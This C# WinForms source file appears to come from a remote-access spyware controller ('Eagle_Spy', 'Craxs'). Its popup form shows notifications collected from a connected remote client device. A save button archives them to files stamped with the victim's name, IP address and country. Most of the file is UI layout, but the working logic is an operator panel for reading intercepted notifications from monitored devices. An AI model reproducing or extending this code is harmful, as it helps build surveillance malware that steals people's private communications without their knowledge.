using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class Craxspopup : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbutton")]
	private DrakeUIButtonIcon _checkbutton;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	public Client ClassClient;

	[field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
	;

	[field: AccessedThroughProperty("Panel2")]
	internal Panel Panel2
    ;
    [field: AccessedThroughProperty("Panel3")]
	internal Panel Panel3
	

    ;

        [field: AccessedThroughProperty("Panel4")]
	internal Panel Panel4
    ;

    [field: AccessedThroughProperty("Panel5")]
	internal Panel Panel5
    ;

    [field: AccessedThroughProperty("notifitext")]
	internal TextBox notifitext
    ;

	internal DrakeUIButtonIcon checkbutton
;

	internal DrakeUIButtonIcon DrakeUIButtonIcon1
;

	[field: AccessedThroughProperty("ToolTips")]
	internal DrakeUIToolTip ToolTips
    ;

	internal DrakeUIButtonIcon DrakeUIButtonIcon2
;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.checkbutton = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.Panel3 = new System.Windows.Forms.Panel();
            this.Panel4 = new System.Windows.Forms.Panel();
            this.Panel5 = new System.Windows.Forms.Panel();
            this.notifitext = new System.Windows.Forms.TextBox();
            this.ToolTips = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.Panel1.SuspendLayout();
            this.Panel5.SuspendLayout();
            this.SuspendLayout();
            // 
            // Panel1
            // 
            this.Panel1.BackColor = System.Drawing.Color.Transparent;
            this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
            this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
            this.Panel1.Controls.Add(this.checkbutton);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel1.Location = new System.Drawing.Point(0, 0);
            this.Panel1.Margin = new System.Windows.Forms.Padding(2);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(365, 108);
            this.Panel1.TabIndex = 0;
            // 
            // DrakeUIButtonIcon2
            // 
            this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(240, 78);
            this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(2);
            this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
            this.DrakeUIButtonIcon2.Radius = 15;
            this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(54, 24);
            this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon2.Symbol = 61544;
            this.DrakeUIButtonIcon2.TabIndex = 3;
            this.ToolTips.SetToolTip(this.DrakeUIButtonIcon2, "Hide");
            this.DrakeUIButtonIcon2.Click += new System.EventHandler(this.DrakeUIButtonIcon2_Click);
            // 
            // DrakeUIButtonIcon1
            // 
            this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(182, 78);
            this.DrakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(2);
            this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
            this.DrakeUIButtonIcon1.Radius = 15;
            this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(54, 24);
            this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon1.StyleCustomMode = true;
            this.DrakeUIButtonIcon1.Symbol = 61639;
            this.DrakeUIButtonIcon1.TabIndex = 2;
            this.ToolTips.SetToolTip(this.DrakeUIButtonIcon1, "Save");
            this.DrakeUIButtonIcon1.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // checkbutton
            // 
            this.checkbutton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkbutton.FillColor = System.Drawing.Color.Black;
            this.checkbutton.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkbutton.Location = new System.Drawing.Point(298, 78);
            this.checkbutton.Margin = new System.Windows.Forms.Padding(2);
            this.checkbutton.Name = "checkbutton";
            this.checkbutton.Radius = 15;
            this.checkbutton.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.checkbutton.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.checkbutton.Size = new System.Drawing.Size(54, 24);
            this.checkbutton.Style = DrakeUI.Framework.UIStyle.Custom;
            this.checkbutton.Symbol = 61453;
            this.checkbutton.TabIndex = 1;
            this.ToolTips.SetToolTip(this.checkbutton, "Clear & Close");
            this.checkbutton.Click += new System.EventHandler(this.Checkbutton_Click);
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Transparent;
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Left;
            this.Panel2.Location = new System.Drawing.Point(0, 108);
            this.Panel2.Margin = new System.Windows.Forms.Padding(2);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(13, 233);
            this.Panel2.TabIndex = 1;
            // 
            // Panel3
            // 
            this.Panel3.BackColor = System.Drawing.Color.Transparent;
            this.Panel3.Dock = System.Windows.Forms.DockStyle.Right;
            this.Panel3.Location = new System.Drawing.Point(352, 108);
            this.Panel3.Margin = new System.Windows.Forms.Padding(2);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(13, 233);
            this.Panel3.TabIndex = 2;
            // 
            // Panel4
            // 
            this.Panel4.BackColor = System.Drawing.Color.Transparent;
            this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel4.Location = new System.Drawing.Point(13, 324);
            this.Panel4.Margin = new System.Windows.Forms.Padding(2);
            this.Panel4.Name = "Panel4";
            this.Panel4.Size = new System.Drawing.Size(339, 17);
            this.Panel4.TabIndex = 3;
            // 
            // Panel5
            // 
            this.Panel5.BackColor = System.Drawing.Color.Black;
            this.Panel5.Controls.Add(this.notifitext);
            this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Panel5.Location = new System.Drawing.Point(13, 108);
            this.Panel5.Margin = new System.Windows.Forms.Padding(2);
            this.Panel5.Name = "Panel5";
            this.Panel5.Size = new System.Drawing.Size(339, 216);
            this.Panel5.TabIndex = 4;
            // 
            // notifitext
            // 
            this.notifitext.BackColor = System.Drawing.Color.Black;
            this.notifitext.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.notifitext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.notifitext.Font = new System.Drawing.Font("Calibri", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.notifitext.ForeColor = System.Drawing.Color.White;
            this.notifitext.Location = new System.Drawing.Point(0, 0);
            this.notifitext.Multiline = true;
            this.notifitext.Name = "notifitext";
            this.notifitext.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.notifitext.Size = new System.Drawing.Size(339, 216);
            this.notifitext.TabIndex = 2;
            this.notifitext.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // ToolTips
            // 
            this.ToolTips.BackColor = System.Drawing.Color.Black;
            this.ToolTips.ForeColor = System.Drawing.Color.White;
            this.ToolTips.OwnerDraw = true;
            this.ToolTips.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // Eaglepopup
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.DarkRed;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.ClientSize = new System.Drawing.Size(365, 341);
            this.Controls.Add(this.Panel5);
            this.Controls.Add(this.Panel4);
            this.Controls.Add(this.Panel3);
            this.Controls.Add(this.Panel2);
            this.Controls.Add(this.Panel1);
            this.DoubleBuffered = true;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "Eaglepopup";
            this.Text = "Notification";
            this.Panel1.ResumeLayout(false);
            this.Panel5.ResumeLayout(false);
            this.Panel5.PerformLayout();
            this.ResumeLayout(false);

	}

	public Craxspopup()
	{
		base.Load += Craxsnotification_Load;
		base.Deactivate += Craxsnotification_Deactivate;
		InitializeComponent();
	}

	private void Craxsnotification_Load(object sender, EventArgs e)
	{
		base.Location = new Point(checked(Cursor.Position.X - 79), Cursor.Position.Y);
		BackColor = Color.DarkRed;
		base.TransparencyKey = Color.DarkRed;
		if (ClassClient != null)
		{
			if (ClassClient.Notifications.Count() > 0)
			{
				notifitext.Text = "Notifications Reader...\r\n";
				string[] notifications = ClassClient.Notifications;
				foreach (string text in notifications)
				{
					try
					{
						if (text != null && text.Length > 0)
						{
							TextBox textBox;
							(textBox = notifitext).Text = textBox.Text + text + "\r\n--------------------";
						}
					}
					catch (Exception)
					{
						//ProjectData.SetProjectError(projectError);
						//////CraxsAlert.Showinformation("Sorry");
					}
				}
			}
			else
				notifitext.Text += "No Notifications ...";
		}
		ClassClient.isnewnotifi = false;
	}

	private void DrakeUIButton1_Click(object sender, EventArgs e)
	{
	}

	private void Craxsnotification_Deactivate(object sender, EventArgs e)
	{
		Close();
	}

	private void Checkbutton_Click(object sender, EventArgs e)
	{
		notifitext.Text = "";
		ClassClient.Notifications = new string[251];
		Close();
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(notifitext.Text))
		{
			CraxsAlert.Showinformation("No log found to save");
			return;
		}
		try
		{
			if (!Directory.Exists(ClassClient.FolderUSER + "\\Notificatios"))
				Directory.CreateDirectory(ClassClient.FolderUSER + "\\Notificatios");
			string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
			if (!File.Exists(ClassClient.FolderUSER + "\\Notificatios\\" + text))
			{
				File.Create(ClassClient.FolderUSER + "\\Notificatios\\" + text).Dispose();
				File.AppendAllText(ClassClient.FolderUSER + "\\Notificatios\\" + text, "Client Name: " + ClassClient.ClientName + "\r\nClient IP: " + ClassClient.ClientAddressIP + "\r\nCountry: " + ClassClient.Country + "\r\nDate :" + DateTime.Now.ToString() + "\r\n----------------------------------------\r\n");
			}
			File.AppendAllText(ClassClient.FolderUSER + "\\Notificatios\\" + text, text + notifitext.Text + "\r\n");
			Process.Start(ClassClient.FolderUSER + "\\Notificatios");
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}
}
